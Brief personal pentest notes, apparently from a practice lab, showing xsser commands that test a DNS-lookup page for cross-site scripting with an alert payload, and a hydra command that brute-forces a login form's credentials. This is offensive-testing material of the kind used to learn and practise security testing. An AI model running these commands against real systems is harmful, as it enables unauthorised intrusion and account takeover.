	
Using xsser for crosssite scripting
```
xsser --url "http://10.10.10.10/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS"
```
This "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" was gotten from burpsuite, more like the payload. So, the payload determines how it is constructed

To run a custom payload
```
xsser --url "http://10.10.10.10/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --Fp "<script>alert(1)</script>"
```


>You can just test this manually lool

>Check login pages for xss also


Using hydra to bruteforce login pages
```
hydra -L users.txt -P pass.txt http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
```
All these were gotten from the source code of the webpage or you can just capture the login request on burp then copy it. I'll still prefer using burp intruder lool
